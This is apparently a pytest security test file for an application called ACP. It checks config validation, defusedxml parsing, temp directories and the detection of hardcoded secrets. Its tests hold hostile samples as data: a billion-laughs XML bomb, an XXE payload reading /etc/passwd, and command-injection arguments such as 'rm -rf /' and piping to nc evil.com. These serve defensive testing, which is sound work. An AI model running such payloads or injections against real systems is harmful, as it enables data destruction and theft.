"""Security tests for ACP services."""

import os
import tempfile
from unittest.mock import Mock, patch

import pytest
from app.parsers.code_parser import CodeParser
from app.parsers.confluence_parser import ConfluenceParser
from app.resilience.retry import RetryConfig, RetryManager
from app.security_config import SecurityConfig, validate_security_config
from app.services.export_service import ExportService
from defusedxml.ElementTree import ParseError


class TestSecurityConfig:
    """Test security configuration validation."""

    def test_security_config_fail_fast_validation(self):
        """Test that security config fails fast with invalid secrets."""
        with pytest.raises(ValueError, match="SECRET_KEY must be set"):
            SecurityConfig(
                secret_key="your-secret-key-change-this-in-production",
                jwt_secret_key="test-jwt-secret-key-that-is-long-enough",
                encryption_key="test-encryption-key-that-is-long-enough",
                oauth2_client_id="test-client-id",
                oauth2_client_secret="test-client-secret",
                oauth2_authorization_url="https://test.com/oauth/authorize",
                oauth2_token_url="https://test.com/oauth/token",
                oauth2_userinfo_url="https://test.com/oauth/userinfo",
                oauth2_redirect_uri="http://localhost:3000/auth/callback",
            )

    def test_security_config_weak_patterns_rejected(self):
        """Test that weak secret patterns are rejected."""
        weak_patterns = [
            "password123",
            "secret",
            "admin",
            "test",
            "changeme",
            "default",
        ]

        for pattern in weak_patterns:
            with pytest.raises(ValueError, match="contains weak patterns"):
                SecurityConfig(
                    secret_key=pattern,
                    jwt_secret_key="test-jwt-secret-key-that-is-long-enough",
                    encryption_key="test-encryption-key-that-is-long-enough",
                    oauth2_client_id="test-client-id",
                    oauth2_client_secret="test-client-secret",
                    oauth2_authorization_url="https://test.com/oauth/authorize",
                    oauth2_token_url="https://test.com/oauth/token",
                    oauth2_userinfo_url="https://test.com/oauth/userinfo",
                    oauth2_redirect_uri="http://localhost:3000/auth/callback",
                )

    def test_security_config_production_validation(self):
        """Test production security validation."""
        config = SecurityConfig(
            secret_key="test-secret-key-that-is-long-enough",
            jwt_secret_key="test-jwt-secret-key-that-is-long-enough",
            encryption_key="test-encryption-key-that-is-long-enough",
            oauth2_client_id="test-client-id",
            oauth2_client_secret="test-client-secret",
            oauth2_authorization_url="https://test.com/oauth/authorize",
            oauth2_token_url="https://test.com/oauth/token",
            oauth2_userinfo_url="https://test.com/oauth/userinfo",
            oauth2_redirect_uri="http://localhost:3000/auth/callback",
            environment="production",
            debug=True,  # Should fail in production
            ssl_enabled=False,  # Should fail in production
            cors_origins=["*"],  # Should fail in production
        )

        errors = config.validate_production_security()
        assert len(errors) > 0
        assert any("DEBUG must be False" in error for error in errors)
        assert any("SSL must be enabled" in error for error in errors)
        assert any("CORS origins must be restricted" in error for error in errors)


class TestXMLSecurity:
    """Test XML parsing security."""

    def test_defusedxml_protection_against_xml_bomb(self):
        """Test that defusedxml protects against XML bomb attacks."""
        # XML bomb payload
        xml_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>"""

        # This should raise an exception due to XML bomb protection
        with pytest.raises(ParseError):
            from defusedxml import ElementTree as ET

            ET.fromstring(xml_bomb)

    def test_defusedxml_protection_against_external_entities(self):
        """Test that defusedxml protects against external entity attacks."""
        # External entity payload
        external_entity = """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>&xxe;</foo>"""

        # This should raise an exception due to external entity protection
        with pytest.raises(ParseError):
            from defusedxml import ElementTree as ET

            ET.fromstring(external_entity)

    def test_code_parser_xml_security(self):
        """Test that code parser uses secure XML parsing."""
        parser = CodeParser()

        # Test with malformed XML
        malformed_xml = "<root><unclosed>"

        # This should not crash the system
        result = parser._parse_xml_report(malformed_xml)
        assert result == []

    def test_confluence_parser_xml_security(self):
        """Test that confluence parser uses secure XML parsing."""
        parser = ConfluenceParser()

        # Test with malformed XML
        malformed_xml = "<root><unclosed>"

        # This should not crash the system
        result = parser._parse_xml_content(malformed_xml)
        assert result == []


class TestRetrySecurity:
    """Test retry mechanism security."""

    def test_retry_uses_secure_random(self):
        """Test that retry mechanism uses secure random number generation."""
        config = RetryConfig(
            max_attempts=3,
            backoff_factor=2.0,
            max_delay=60.0,
            min_delay=1.0,
            jitter=True,
        )

        # Test that jitter calculation doesn't use insecure random
        delays = []
        for attempt in range(10):
            delay = config.calculate_delay(attempt)
            delays.append(delay)

        # Ensure we get different values (jitter is working)
        assert len(set(delays)) > 1

        # Ensure delays are within expected range
        for delay in delays:
            assert 0 <= delay <= config.max_delay


class TestTempDirectorySecurity:
    """Test temporary directory security."""

    def test_export_service_uses_secure_temp_dir(self):
        """Test that export service uses secure temporary directory."""
        service = ExportService()

        # Should use system temp directory, not hardcoded /tmp
        temp_dir = service.temp_dir
        assert temp_dir.exists()
        assert "tmp" in str(temp_dir) or "temp" in str(temp_dir)

        # Should not be hardcoded to /tmp
        assert str(temp_dir) != "/tmp/acp_exports"

    def test_temp_directory_cleanup(self):
        """Test that temporary directories are properly cleaned up."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a file in temp directory
            test_file = os.path.join(temp_dir, "test.txt")
            with open(test_file, "w") as f:
                f.write("test")

            # Verify file exists
            assert os.path.exists(test_file)

        # After context manager, directory should be cleaned up
        assert not os.path.exists(temp_dir)


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_code_parser_argument_validation(self):
        """Test that code parser validates command arguments."""
        parser = CodeParser()

        # Test safe arguments
        safe_args = ["project_path", "--format", "xml", "--output", "/safe/path"]

        for arg in safe_args:
            assert parser._is_safe_argument(arg)

        # Test unsafe arguments
        unsafe_args = [
            "project; rm -rf /",
            "project && cat /etc/passwd",
            "project | nc evil.com 1234",
            "project`whoami`",
            "../../../etc/passwd",
            "project$USER",
        ]

        for arg in unsafe_args:
            assert not parser._is_safe_argument(arg)


class TestErrorHandling:
    """Test error handling security."""

    def test_no_bare_except_statements(self):
        """Test that there are no bare except statements."""
        # This test ensures we don't have bare except: statements
        # which can hide security issues

        import ast
        import os

        def check_file_for_bare_except(file_path):
            """Check a file for bare except statements."""
            with open(file_path, "r") as f:
                tree = ast.parse(f.read())

            bare_excepts = []
            for node in ast.walk(tree):
                if isinstance(node, ast.ExceptHandler):
                    if node.type is None:  # Bare except
                        bare_excepts.append(node.lineno)

            return bare_excepts

        # Check key files for bare except statements
        files_to_check = [
            "app/services/ingest_service.py",
            "app/services/auth_service.py",
            "app/parsers/code_parser.py",
        ]

        for file_path in files_to_check:
            if os.path.exists(file_path):
                bare_excepts = check_file_for_bare_except(file_path)
                assert (
                    len(bare_excepts) == 0
                ), f"Bare except statements found in {file_path} at lines: {bare_excepts}"


class TestSecretsManagement:
    """Test secrets management security."""

    def test_no_hardcoded_secrets_in_code(self):
        """Test that no hardcoded secrets exist in the codebase."""
        import os
        import re

        # Patterns that might indicate hardcoded secrets
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'key\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
        ]

        # Files to check (exclude test files and config files)
        files_to_check = []
        for root, dirs, files in os.walk("app"):
            for file in files:
                if file.endswith(".py") and not file.startswith("test_"):
                    files_to_check.append(os.path.join(root, file))

        for file_path in files_to_check:
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    content = f.read()

                for pattern in secret_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    # Filter out legitimate cases (like "password" field in forms)
                    for match in matches:
                        if not any(
                            legitimate in match.lower()
                            for legitimate in [
                                "password=",  # Form field
                                "secret=",  # Configuration key
                                "key=",  # Configuration key
                                "token=",  # Configuration key
                            ]
                        ):
                            pytest.fail(
                                f"Potential hardcoded secret found in {file_path}: {match}"
                            )


if __name__ == "__main__":
    pytest.main([__file__])
